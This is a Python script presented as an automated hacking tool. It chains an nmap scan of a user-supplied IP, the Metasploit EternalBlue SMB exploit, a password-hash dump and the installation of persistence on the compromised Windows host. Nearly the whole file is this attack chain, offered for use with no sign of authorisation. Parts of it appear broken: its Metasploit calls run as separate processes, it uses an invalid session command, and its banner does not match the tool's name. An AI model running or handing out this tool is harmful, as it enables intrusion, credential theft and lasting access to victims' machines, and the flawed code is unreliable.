import os
import re
import subprocess
import time

# Function to clear screen based on OS
def clear_screen():
    """Clear terminal screen based on OS."""
    if os.name == 'nt':  # For Windows
        os.system('cls')
    else:  # For Linux and macOS
        os.system('clear')

# Function to display banner/logo
def display_banner():
    """Display logo and welcome banner."""
    print("""
    ██████╗ ███████╗██████╗ ███████╗████████╗ ██████╗
    ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗
    ██████╔╝█████╗  ██████╔╝██████╗     ██║   ██████╔╝
    ██╔═══╝ ██╔══╝  ██╔═══╝ ╚════██╗    ██║   ██╔═══╝
    ██║     ███████╗██║     ███████╔╝    ██║   ██║
    ╚═╝     ╚══════╝╚═╝     ╚═════╝     ╚═╝   ╚═╝
    ===================================================
              ReconRapid - Automated Hacking Tool
    ===================================================
    """)

# Function to get the target IP address
def get_target_ip():
    """Ask user for a valid target IP address."""
    while True:
        ip = input("[?] Enter Target IP Address: ").strip()
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
            return ip
        else:
            print("[-] Invalid IP format. Please try again.")

# Function for Reconnaissance Phase (Nmap Scan)
def scan_target(ip):
    """Run Nmap to scan open ports and services with -Pn (skip ping)."""
    print(f"[+] Scanning target: {ip}")
    try:
        result = subprocess.check_output(
            ["nmap", "-sV", "-T4", "-Pn", ip],
            stderr=subprocess.STDOUT
        ).decode()
        print(f"[+] Scan Complete. Results:\n{result}")
        return result
    except Exception as e:
        print(f"[-] Error during scan: {e}")
        return None

# Function for Exploitation Phase (Metasploit SMB EternalBlue)
def run_exploit(ip):
    """Run Metasploit or other exploit against SMB (EternalBlue)."""
    print(f"[+] Exploiting target: {ip}")
    try:
        # Example: Running EternalBlue exploit using MSFconsole
        result = subprocess.check_output(
            ["msfconsole", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOST {ip}; run"],
            stderr=subprocess.STDOUT
        ).decode()
        print(f"[+] Exploit Output:\n{result}")
        if "Meterpreter session" in result:
            print("[+] Exploit Successful! Reverse shell obtained.")
            return True
        else:
            print("[-] Exploit failed. Check for errors.")
            return False
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        return False

# Function for Post-Exploitation Phase (Meterpreter Hash Dump and Persistence)
def run_post_exp(ip):
    """Run post-exploitation steps like dumping hashes and setting persistence."""
    print(f"[+] Post-exploitation for target: {ip}")
    try:
        # Example: Dump hashes using Meterpreter
        result = subprocess.check_output(
            ["msfconsole", "-x", f"session -i 1; run post/windows/gather/hashdump"],
            stderr=subprocess.STDOUT
        ).decode()
        print(f"[+] Hashdump:\n{result}")

        # Example: Add persistence
        persistence = subprocess.check_output(
            ["msfconsole", "-x", f"session -i 1; run post/windows/manage/persistence"],
            stderr=subprocess.STDOUT
        ).decode()
        print(f"[+] Persistence Setup:\n{persistence}")

        return True
    except Exception as e:
        print(f"[-] Error during post-exploitation: {e}")
        return False

# Main Function to control flow of Reconnaissance, Exploitation, and Post-Exploitation
def main():
    # Clear screen at start
    clear_screen()

    # Display tool logo and welcome banner
    display_banner()

    # Get user input for target IP address
    target_ip = get_target_ip()

    # Start reconnaissance
    print("[*] Starting reconnaissance...")
    recon_results = scan_target(target_ip)

    if recon_results:
        print("[+] Recon complete. Moving to exploitation...\n")
        # Exploit target machine
        exploit_results = run_exploit(target_ip)
        if exploit_results:
            print("[+] Exploitation successful. Moving to post-exploitation...\n")
            # Post-exploitation actions
            post_exp_results = run_post_exp(target_ip)
            print("[+] Post-exploitation complete.")
        else:
            print("[-] Exploitation failed. Exiting.")
    else:
        print("[-] Recon failed. Exiting.")

# Entry Point of the Program
if __name__ == "__main__":
    main()
